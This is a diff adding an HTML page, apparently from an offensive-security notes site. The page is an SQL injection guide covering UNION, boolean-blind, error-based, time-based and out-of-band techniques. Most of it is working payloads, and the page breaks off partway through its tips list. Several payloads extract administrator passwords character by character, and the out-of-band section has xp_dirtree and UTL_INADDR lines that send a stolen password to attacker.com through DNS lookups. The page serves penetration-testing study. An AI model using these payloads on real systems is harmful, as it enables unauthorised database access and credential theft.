@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="Comprehensive guide on detecting and exploiting SQL injection vulnerabilities, including blind, error-based, time-based, and out-of-band techniques with payloads, examples, and automation using sqlmap.">
+  <title>offsecnotes | SQL injection</title>
+  <link rel="icon" type="image/png" href="/static/favicon.png">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@exampledev/new.css@1.1.2/new.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github.min.css" media="(prefers-color-scheme: light)" data-theme-css="light">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github-dark.min.css" media="(prefers-color-scheme: dark)" data-theme-css="dark">
+  <link rel="stylesheet" href="/static/style.css">
+  <script>
+    // Theme: saved choice (light/dark) or, if none, the system preference.
+    // Runs before the page is drawn, so there's no flash of the wrong theme.
+    function setTheme(theme) {
+      document.documentElement.dataset.theme = theme;
+      document.querySelectorAll("link[data-theme-css]").forEach(function (link) {
+        link.media = link.dataset.themeCss === theme ? "all" : "not all";
+      });
+    }
+    function toggleTheme() {
+      var current = document.documentElement.dataset.theme ||
+        (matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light");
+      var next = current === "dark" ? "light" : "dark";
+      setTheme(next);
+      try { localStorage.setItem("theme", next); } catch (e) {}
+    }
+    try { var saved = localStorage.getItem("theme"); if (saved) setTheme(saved); } catch (e) {}
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/highlight.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/languages/go.min.js"></script>
+  <script>hljs.highlightAll();</script>
+</head>
+<body>
+  <header>
+    <div class="header-top">
+      <h1>offsecnotes</h1>
+      <button class="theme-toggle" onclick="toggleTheme()" aria-label="Toggle light/dark theme" title="Toggle theme"></button>
+    </div>
+    <nav>
+      <a href="/">Home</a> • <a href="/Android/">Android</a> • <a href="/Web/">Web</a> •
+      <a href="/Network/">Network</a> • <a href="/Linux/">Linux</a> •
+      <a href="/Windows/">Windows</a> • <a href="/Misc/">Misc</a>
+    </nav>
+  </header>
+  <h1>SQL injection</h1>
+  <span>by frankheat</span>
+  <div class="toc"><ul>
+<li><a href="#sql-injection-cheatsheet" id="toc-sql-injection-cheatsheet">SQL Injection Cheatsheet</a></li>
+<li><a href="#overview" id="toc-overview">Overview</a></li>
+<li><a href="#sql-injection-union-attacks" id="toc-sql-injection-union-attacks">SQL injection UNION attacks</a>
+<ul>
+<li><a href="#determining-the-number-of-columns-required" id="toc-determining-the-number-of-columns-required">Determining the number of columns required</a></li>
+<li><a href="#column-data-types" id="toc-column-data-types">Column data types</a></li>
+<li><a href="#examining-database" id="toc-examining-database">Examining database</a></li>
+<li><a href="#retrieving-multiple-values-within-a-single-column" id="toc-retrieving-multiple-values-within-a-single-column">Retrieving multiple values within a single column</a></li>
+</ul></li>
+<li><a href="#blind-sqli" id="toc-blind-sqli">Blind SQLi</a>
+<ul>
+<li><a href="#triggering-conditional-responses" id="toc-triggering-conditional-responses">Triggering conditional responses</a></li>
+<li><a href="#error-based-sql-injection" id="toc-error-based-sql-injection">Error-based SQL injection</a></li>
+<li><a href="#time-based-sql-injection" id="toc-time-based-sql-injection">Time-based SQL injection</a></li>
+<li><a href="#out-of-band-oast-sql-injection" id="toc-out-of-band-oast-sql-injection">Out-Of-Band (OAST) SQL injection</a></li>
+</ul></li>
+<li><a href="#tips" id="toc-tips">Tips</a></li>
+<li><a href="#automatic-exploitation" id="toc-automatic-exploitation">Automatic exploitation</a></li>
+</ul></div>
+  <hr>
+<h2 id="sql-injection-cheatsheet">SQL Injection Cheatsheet</h2>
+<ul>
+<li><a href="https://tib3rius.com/sqli">https://tib3rius.com/sqli</a></li>
+<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">https://portswigger.net/web-security/sql-injection/cheat-sheet</a></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection</a></li>
+</ul>
+<hr />
+<h2 id="overview">Overview</h2>
+<p><strong>How to detect SQLi vulnerabilities</strong></p>
+<ul>
+<li>The single quote character <code>'</code> and look for errors or other anomalies.</li>
+<li>Boolean conditions such as <code>OR 1=1</code> and <code>OR 1=2</code>, and look for differences in the responses.</li>
+<li>Trigger time delays when executed within a SQL query, and look for differences in the time taken to respond.</li>
+<li>OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitor any resulting interactions.</li>
+</ul>
+<blockquote>
+<p><strong>Warning</strong>: <code>OR 1=1</code> If your condition reaches an <code>UPDATE</code> or <code>DELETE</code> statement, for example, it can result in an accidental loss of data.</p>
+</blockquote>
+<p><strong>Database-specific syntax</strong></p>
+<ul>
+<li>Example:
+<ul>
+<li>Oracle: every <code>SELECT</code> query must use the <code>FROM</code> keyword and specify a valid table</li>
+<li>MySQL: the double-dash sequence must be followed by a space</li>
+</ul></li>
+</ul>
+<hr />
+<h2 id="sql-injection-union-attacks">SQL injection UNION attacks</h2>
+<p>Requirements:</p>
+<ul>
+<li>The number of the columns returned by the original query</li>
+<li>Columns from the original query must support data types for injected query results</li>
+</ul>
+<h3 id="determining-the-number-of-columns-required">Determining the number of columns required</h3>
+<p><strong>First way</strong>: Injecting a series of <code>ORDER BY</code> clauses and incrementing the specified column index until an error occurs. Example (the injection point is a quoted string within the <code>WHERE</code> clause)</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="st">&#39; ORDER BY 1-- -</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="st">&#39;</span> <span class="kw">ORDER</span> <span class="kw">BY</span> <span class="dv">2</span><span class="co">-- -</span></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="st">&#39; ORDER BY 3-- -</span></span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="st">-- etc.</span></span></code></pre></div>
+<hr />
+<p><strong>Second way</strong>: submitting a series of <code>UNION SELECT</code> payloads specifying a different number of null values. NULL is convertible to every common data type, so it maximizes the chance that the payload will succeed when the column count is correct.</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="st">&#39; UNION SELECT NULL-- -</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="st">&#39;</span> <span class="kw">UNION</span> <span class="kw">SELECT</span> <span class="kw">NULL</span>,<span class="kw">NULL</span><span class="co">-- -</span></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="st">&#39; UNION SELECT NULL,NULL,NULL-- -</span></span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a><span class="st">-- etc.</span></span></code></pre></div>
+<blockquote>
+<p><strong>Note</strong>: The application might actually return the database error in its HTTP response, but may return a generic error or simply return no results.</p>
+</blockquote>
+<h3 id="column-data-types">Column data types</h3>
+<p>Do you want a string?</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="st">&#39; UNION SELECT &#39;</span>a<span class="st">&#39;,NULL,NULL,NULL-- -</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="st">&#39;</span> <span class="kw">UNION</span> <span class="kw">SELECT</span> <span class="kw">NULL</span>,<span class="st">&#39;a&#39;</span>,<span class="kw">NULL</span>,<span class="kw">NULL</span><span class="co">-- -</span></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="st">&#39; UNION SELECT NULL,NULL,&#39;</span>a<span class="st">&#39;,NULL-- -</span></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a><span class="st">&#39;</span> <span class="kw">UNION</span> <span class="kw">SELECT</span> <span class="kw">NULL</span>,<span class="kw">NULL</span>,<span class="kw">NULL</span>,<span class="st">&#39;a&#39;</span><span class="co">-- -</span></span></code></pre></div>
+<p>If no error occurs and the response includes the injected string, the column is suitable for retrieving string data.</p>
+<h3 id="examining-database">Examining database</h3>
+<ul>
+<li><code>' UNION SELECT @@version--</code></li>
+<li>Most database types (except Oracle) have a set of views called the information schema</li>
+</ul>
+<div class="sourceCode" id="cb4"><pre class="sourceCode markdown"><code class="sourceCode markdown"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="fu"># MySQL</span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="fu"># information_schema.tables</span></span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a>TABLE_CATALOG    TABLE_SCHEMA    TABLE_NAME    TABLE_TYPE</span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a>MyDatabase       dbo             Products      BASE TABLE</span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a><span class="fu"># information_schema.columns</span></span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a>TABLE_CATALOG    TABLE_SCHEMA    TABLE_NAME    COLUMN_NAME    DATA_TYPE</span>
+<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a>MyDatabase       dbo             Users          UserId        id</span>
+<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a><span class="fu"># Find tables names</span></span>
+<span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a>SELECT * FROM information_schema.tables</span>
+<span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a><span class="fu"># Find columns names</span></span>
+<span id="cb4-13"><a href="#cb4-13" aria-hidden="true" tabindex="-1"></a>SELECT * FROM information_schema.columns WHERE table_name = &#39;Users&#39;SELECT * FROM information_schema.tables</span>
+<span id="cb4-14"><a href="#cb4-14" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-15"><a href="#cb4-15" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-16"><a href="#cb4-16" aria-hidden="true" tabindex="-1"></a><span class="fu"># Oracle</span></span>
+<span id="cb4-17"><a href="#cb4-17" aria-hidden="true" tabindex="-1"></a>SELECT * FROM all_tables</span>
+<span id="cb4-18"><a href="#cb4-18" aria-hidden="true" tabindex="-1"></a>SELECT TABLE_NAME FROM all_tables</span>
+<span id="cb4-19"><a href="#cb4-19" aria-hidden="true" tabindex="-1"></a>SELECT * FROM all_tab_columns WHERE table_name = &#39;USERS&#39;</span>
+<span id="cb4-20"><a href="#cb4-20" aria-hidden="true" tabindex="-1"></a>SELECT COLUMN_NAME FROM all_tab_columns WHERE table_name = &#39;USERS&#39;</span></code></pre></div>
+<h3 id="retrieving-multiple-values-within-a-single-column">Retrieving multiple values within a single column</h3>
+<p>You can retrieve multiple values together within this single column by concatenating the values together.</p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="st">&#39; UNION SELECT username || &#39;</span>~<span class="st">&#39; || password FROM users-- -</span></span></code></pre></div>
+<hr />
+<h2 id="blind-sqli">Blind SQLi</h2>
+<p>Blind SQLi occurs when an application is vulnerable to SQLi, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.</p>
+<h3 id="triggering-conditional-responses">Triggering conditional responses</h3>
+<p><strong>Detection</strong></p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> TrackingId <span class="kw">FROM</span> TrackedUsers <span class="kw">WHERE</span> TrackingId <span class="op">=</span> <span class="st">&#39;u5YD3PapBcR4lN3e7Tj4&#39;</span></span></code></pre></div>
+<div class="sourceCode" id="cb7"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a>xyz<span class="st">&#39; AND &#39;</span><span class="dv">1</span><span class="st">&#39;=&#39;</span><span class="dv">1</span></span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a>xyz<span class="st">&#39; AND &#39;</span><span class="dv">1</span><span class="st">&#39;=&#39;</span><span class="dv">2</span></span></code></pre></div>
+<p>See differences in response. Watch for subtle changes you might miss in the render! Use Burp’s comparer</p>
+<p><strong>Extract data one piece at a time</strong></p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a>xyz<span class="st">&#39; AND SUBSTRING((SELECT Psw FROM Users WHERE Username = &#39;</span>Admin<span class="st">&#39;), 1, 1) = &#39;</span>s</span></code></pre></div>
+<p>See the response to confirm that the first character of the password is <code>s</code></p>
+<p>We can continue this process to systematically extract data.</p>
+<h3 id="error-based-sql-injection">Error-based SQL injection</h3>
+<p><strong>Blind SQLi with conditional errors</strong></p>
+<p>Problem: Some applications carry out SQL queries but their behavior doesn’t change, regardless of whether the query returns any data. The technique “Triggering conditional responses” won’t work, because injecting different boolean conditions makes no difference to the application’s responses.</p>
+<ul>
+<li>It’s often possible to induce the application to return a different response depending on whether a SQL error occurs and extract or infer sensitive data from the database, even in blind contexts.</li>
+<li><code>xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a</code>
+<ul>
+<li>The CASE expression evaluates to ‘a’, which does not cause any error.</li>
+</ul></li>
+<li><code>xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a</code>
+<ul>
+<li>It evaluates to 1/0, which causes a divide-by-zero error.</li>
+</ul></li>
+<li>You can use this to determine whether the injected condition is true.</li>
+<li><code>xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) &gt; 'm') THEN 1/0 ELSE 'a' END FROM Users)='a</code></li>
+</ul>
+<blockquote>
+<p><strong>Note</strong>: There are different ways of triggering conditional errors, and different techniques work best on different database types. See SQL cheat sheet from tib3rius -&gt; (Boolean Error Inferential Exploitation).</p>
+</blockquote>
+<details>
+<summary>
+Example
+</summary>
+<div class="sourceCode" id="cb9"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="co"># In this example the response are always the same. </span></span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a><span class="ex">However,</span> if you submit an invalid query you will get an error.</span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a><span class="co"># 1 - Check if it&#39;s vulnerable</span></span>
+<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a><span class="ex">---</span></span>
+<span id="cb9-6"><a href="#cb9-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb9-7"><a href="#cb9-7" aria-hidden="true" tabindex="-1"></a><span class="co">## Normal request. 200 OK</span></span>
+<span id="cb9-8"><a href="#cb9-8" aria-hidden="true" tabindex="-1"></a><span class="ex">Cookie:</span> TrackingId=xyz</span>
+<span id="cb9-9"><a href="#cb9-9" aria-hidden="true" tabindex="-1"></a><span class="ex">---</span></span>
+<span id="cb9-10"><a href="#cb9-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb9-11"><a href="#cb9-11" aria-hidden="true" tabindex="-1"></a><span class="co">## Cause error. 500 Internal Server Error</span></span>
+<span id="cb9-12"><a href="#cb9-12" aria-hidden="true" tabindex="-1"></a><span class="ex">Cookie:</span> TrackingId=xyz<span class="st">&#39;</span></span>
+<span id="cb9-13"><a href="#cb9-13" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb9-14"><a href="#cb9-14" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb9-15"><a href="#cb9-15" aria-hidden="true" tabindex="-1"></a><span class="st"># 2 - Identify database [tiberius cheatsheet]. NOTE: add comment at the end...</span></span>
+<span id="cb9-16"><a href="#cb9-16" aria-hidden="true" tabindex="-1"></a><span class="st">---</span></span>
+<span id="cb9-17"><a href="#cb9-17" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb9-18"><a href="#cb9-18" aria-hidden="true" tabindex="-1"></a><span class="st">## (MySql). 500 Internal Server Error</span></span>
+<span id="cb9-19"><a href="#cb9-19" aria-hidden="true" tabindex="-1"></a><span class="st">Cookie: TrackingId=xyz&#39;</span> AND <span class="st">&#39;foo&#39;</span> <span class="st">&#39;bar&#39;</span> = <span class="st">&#39;foobar&#39;</span>#</span>
+<span id="cb9-20"><a href="#cb9-20" aria-hidden="true" tabindex="-1"></a><span class="ex">---</span></span>
+<span id="cb9-21"><a href="#cb9-21" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb9-22"><a href="#cb9-22" aria-hidden="true" tabindex="-1"></a><span class="co">## (ORACLE). 200 OK</span></span>
+<span id="cb9-23"><a href="#cb9-23" aria-hidden="true" tabindex="-1"></a><span class="ex">Cookie:</span> TrackingId=a<span class="st">&#39; AND LENGTHB(&#39;</span>foo<span class="st">&#39;) = &#39;</span>3<span class="st">&#39;--</span></span>
+<span id="cb9-24"><a href="#cb9-24" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb9-25"><a href="#cb9-25" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb9-26"><a href="#cb9-26" aria-hidden="true" tabindex="-1"></a><span class="st"># 3 - Test boolean error. </span></span>
+<span id="cb9-27"><a href="#cb9-27" aria-hidden="true" tabindex="-1"></a><span class="st">---</span></span>
+<span id="cb9-28"><a href="#cb9-28" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb9-29"><a href="#cb9-29" aria-hidden="true" tabindex="-1"></a><span class="st">## Error condition: 500 OK</span></span>
+<span id="cb9-30"><a href="#cb9-30" aria-hidden="true" tabindex="-1"></a><span class="st">Cookie: TrackingId=xyz&#39;</span> AND 1=<span class="er">(</span><span class="ex">SELECT</span> CASE WHEN <span class="er">(</span><span class="ex">1=1</span><span class="kw">)</span> <span class="ex">THEN</span> TO_CHAR<span class="er">(</span><span class="ex">1/0</span><span class="kw">)</span> <span class="ex">ELSE</span> <span class="st">&#39;1&#39;</span> END FROM dual<span class="kw">)</span><span class="ex">--</span></span>
+<span id="cb9-31"><a href="#cb9-31" aria-hidden="true" tabindex="-1"></a><span class="ex">---</span></span>
+<span id="cb9-32"><a href="#cb9-32" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb9-33"><a href="#cb9-33" aria-hidden="true" tabindex="-1"></a><span class="co">## No error condition: 200 OK</span></span>
+<span id="cb9-34"><a href="#cb9-34" aria-hidden="true" tabindex="-1"></a><span class="ex">Cookie:</span> TrackingId=xyz<span class="st">&#39; AND 1=(SELECT CASE WHEN (2=1) THEN TO_CHAR(1/0) ELSE &#39;</span>1<span class="st">&#39; END FROM dual)--</span></span>
+<span id="cb9-35"><a href="#cb9-35" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb9-36"><a href="#cb9-36" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb9-37"><a href="#cb9-37" aria-hidden="true" tabindex="-1"></a><span class="st"># 4 - Extract data</span></span>
+<span id="cb9-38"><a href="#cb9-38" aria-hidden="true" tabindex="-1"></a><span class="st">---</span></span>
+<span id="cb9-39"><a href="#cb9-39" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb9-40"><a href="#cb9-40" aria-hidden="true" tabindex="-1"></a><span class="st">## Error condition: 500 OK (it means that first char is &#39;</span>a<span class="st">&#39;)</span></span>
+<span id="cb9-41"><a href="#cb9-41" aria-hidden="true" tabindex="-1"></a><span class="st">Cookie: TrackingId=xyz&#39;</span> AND 1=<span class="er">(</span><span class="ex">SELECT</span> CASE WHEN <span class="er">(</span><span class="ex">SUBSTR</span><span class="er">((</span><span class="va">SELECT</span> <span class="va">password</span> <span class="va">FROM</span> <span class="va">users</span> <span class="va">WHERE</span> <span class="va">username</span> <span class="op">=</span> <span class="st">&#39;administrator&#39;</span><span class="kw">)</span><span class="ex">,</span> 1, 1<span class="kw">)</span> <span class="ex">=</span> <span class="st">&#39;a&#39;</span><span class="kw">)</span> <span class="ex">THEN</span> TO_CHAR<span class="er">(</span><span class="ex">1/0</span><span class="kw">)</span> <span class="ex">ELSE</span> <span class="st">&#39;1&#39;</span> END FROM dual<span class="kw">)</span><span class="ex">--</span></span>
+<span id="cb9-42"><a href="#cb9-42" aria-hidden="true" tabindex="-1"></a><span class="ex">---</span></span>
+<span id="cb9-43"><a href="#cb9-43" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb9-44"><a href="#cb9-44" aria-hidden="true" tabindex="-1"></a><span class="co">## No error condition: 200 OK</span></span>
+<span id="cb9-45"><a href="#cb9-45" aria-hidden="true" tabindex="-1"></a><span class="ex">Cookie:</span> TrackingId=xyz<span class="st">&#39; AND 1=(SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username = &#39;</span>administrator<span class="st">&#39;), 1, 1) = &#39;</span>b<span class="st">&#39;) THEN TO_CHAR(1/0) ELSE &#39;</span>1<span class="st">&#39; END FROM dual)--</span></span></code></pre></div>
+</details>
+<hr />
+<p><strong>Extracting sensitive data via verbose SQL error messages</strong></p>
+<ul>
+<li>Example: inject <code>'</code> and you get an error: <code>Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char</code></li>
+<li>You can use the <code>CAST()</code> function to turns an otherwise blind SQL injection vulnerability into a visible one</li>
+<li><code>TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--</code></li>
+</ul>
+<h3 id="time-based-sql-injection">Time-based SQL injection</h3>
+<ul>
+<li>Condition: As SQL queries are normally processed synchronously by the application, delaying the execution of a SQL query also delays the HTTP response.</li>
+<li>Triggering time delays depending on whether an injected condition is true or false</li>
+<li>We can retrieve data by testing one character at a time</li>
+</ul>
+<div class="sourceCode" id="cb10"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a># MySQL</span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a><span class="kw">AND</span> (<span class="kw">SELECT</span> <span class="dv">1337</span> <span class="kw">FROM</span> (<span class="kw">SELECT</span>(SLEEP(<span class="dv">10</span><span class="op">-</span>(<span class="cf">IF</span>((<span class="dv">1</span><span class="op">=</span><span class="dv">1</span>),<span class="dv">0</span>,<span class="dv">10</span>))))) RANDSTR)</span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a># PostgreSQL</span>
+<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a><span class="kw">AND</span> <span class="dv">1337</span><span class="op">=</span>(<span class="cf">CASE</span> <span class="cf">WHEN</span> (<span class="dv">1</span><span class="op">=</span><span class="dv">1</span>) <span class="cf">THEN</span> (<span class="kw">SELECT</span> <span class="dv">1337</span> <span class="kw">FROM</span> PG_SLEEP(<span class="dv">10</span>)) <span class="cf">ELSE</span> <span class="dv">1337</span> <span class="cf">END</span>)</span>
+<span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a># MSSQL</span>
+<span id="cb10-6"><a href="#cb10-6" aria-hidden="true" tabindex="-1"></a><span class="kw">AND</span> <span class="dv">1337</span><span class="op">=</span>(<span class="cf">CASE</span> <span class="cf">WHEN</span> (<span class="dv">1</span><span class="op">=</span><span class="dv">1</span>) <span class="cf">THEN</span> (<span class="kw">SELECT</span> <span class="fu">COUNT</span>(<span class="op">*</span>) <span class="kw">FROM</span> sysusers <span class="kw">AS</span> sys1,sysusers <span class="kw">AS</span> sys2,sysusers <span class="kw">AS</span> sys3,sysusers <span class="kw">AS</span> sys4,sysusers <span class="kw">AS</span> sys5,sysusers <span class="kw">AS</span> sys6,sysusers <span class="kw">AS</span> sys7) <span class="cf">ELSE</span> <span class="dv">1337</span> <span class="cf">END</span>)</span>
+<span id="cb10-7"><a href="#cb10-7" aria-hidden="true" tabindex="-1"></a># Oracle</span>
+<span id="cb10-8"><a href="#cb10-8" aria-hidden="true" tabindex="-1"></a><span class="kw">AND</span> <span class="dv">1337</span><span class="op">=</span>(<span class="cf">CASE</span> <span class="cf">WHEN</span> (<span class="dv">1</span><span class="op">=</span><span class="dv">1</span>) <span class="cf">THEN</span> DBMS_PIPE.RECEIVE_MESSAGE(<span class="st">&#39;RANDSTR&#39;</span>,<span class="dv">10</span>) <span class="cf">ELSE</span> <span class="dv">1337</span> <span class="cf">END</span>)</span>
+<span id="cb10-9"><a href="#cb10-9" aria-hidden="true" tabindex="-1"></a># SQLite</span>
+<span id="cb10-10"><a href="#cb10-10" aria-hidden="true" tabindex="-1"></a><span class="kw">AND</span> <span class="dv">1337</span><span class="op">=</span>(<span class="cf">CASE</span> <span class="cf">WHEN</span> (<span class="dv">1</span><span class="op">=</span><span class="dv">1</span>) <span class="cf">THEN</span> (<span class="kw">SELECT</span> <span class="dv">1337</span> <span class="kw">FROM</span> (<span class="kw">SELECT</span> <span class="kw">LIKE</span>(<span class="st">&#39;ABCDEFG&#39;</span>,<span class="fu">UPPER</span>(HEX(RANDOMBLOB(<span class="dv">1000000000</span><span class="op">/</span><span class="dv">2</span>)))))) <span class="cf">ELSE</span> <span class="dv">1337</span> <span class="cf">END</span>)</span></code></pre></div>
+<details>
+<summary>
+Attack example and automation with burp (PostgreSQL)
+</summary>
+<ul>
+<li>Attack type: cluster bomb</li>
+<li>Payload position: (substring position) <code>§1§</code> , (char to match)<code>§a§</code></li>
+<li><code>LIMIT 1</code> if you want the first row. Otherwise use <code>LIMIT 1 OFFSET 4</code></li>
+<li>Create new resource pool with maximum concurrent request to 1</li>
+</ul>
+<div class="sourceCode" id="cb11"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a>param<span class="op">=</span><span class="st">&#39; AND 1337=(CASE WHEN ( (select substring(password,§1§,1) from users LIMIT 1 ) = &#39;</span>§a§<span class="st">&#39; ) THEN (SELECT 1337 FROM PG_SLEEP(5)) ELSE 1337 END)--</span></span></code></pre></div>
+</details>
+<h3 id="out-of-band-oast-sql-injection">Out-Of-Band (OAST) SQL injection</h3>
+<p>An application might carry out a SQL query asynchronously (another thread execute the SQL query)</p>
+<div class="sourceCode" id="cb12"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="co">-- Triggering a DNS query</span></span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a><span class="st">&#39;; exec master..xp_dirtree &#39;</span><span class="op">//</span>attacker.com<span class="op">/</span>a<span class="st">&#39;--</span></span>
+<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a><span class="st">&#39;</span> <span class="kw">UNION</span> <span class="kw">SELECT</span> UTL_INADDR.get_host_address(<span class="st">&#39;attacker.com&#39;</span>)</span>
+<span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-5"><a href="#cb12-5" aria-hidden="true" tabindex="-1"></a><span class="co">-- Exfiltrate data</span></span>
+<span id="cb12-6"><a href="#cb12-6" aria-hidden="true" tabindex="-1"></a><span class="st">&#39;; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username=&#39;</span>Administrator<span class="st">&#39;);exec(&#39;</span>master<span class="op">..</span>xp_dirtree <span class="ot">&quot;//&#39;+@p+&#39;.attacker.com/a&quot;</span><span class="st">&#39;)--</span></span></code></pre></div>
+<hr />
+<h2 id="tips">Tips</h2>
+<ul>
+<li>Sometimes when you try to break syntax you receive a response that does not indicate the parameter is vulnerable. <strong>Check if there is a “default” [error] response</strong> or <strong>Build a valid query</strong> that provides a response indicating the parameter is vulnerable … Example:
+<ul>
+<li><code>/stockcheck?productID=1</code> and the response tell you 3 units (stock check)</li>
+<li><code>/stockcheck?productID='</code> and the response tell you 0 units … in all case that you break…</li>
+<li><code>/stockcheck?productID=1 OR 1=1</code> the response give you units for all product…</li>
+</ul></li>
+<li><strong>Don’t always use <code>'</code></strong> to check. Similar to the above case, it would be pointless
+<ul>
+<li><code>/stockcheck?productID=1</code> . You know that exists a productID=2? Ok, try to inject <code>1+1</code> (instead of <code>1 OR 1=1</code> that it can be dangerous).</li>
+</ul></li>
+<li>Remember that you can <strong>encode the cookie value</strong>. This may be useful with payload that use <code>;</code>.</li>
+<li>Remember that <strong>SQLi can occur at any location</strong> (UPDATE, INSERT, SELECT [column, table], ORDER BY)</li>
+<li><strong>SQLi can be even in XML/JSON</strong>…
+<ul>
+<li>If there are some protection, try <strong>XML encode</strong>.</li>
+</ul></li>
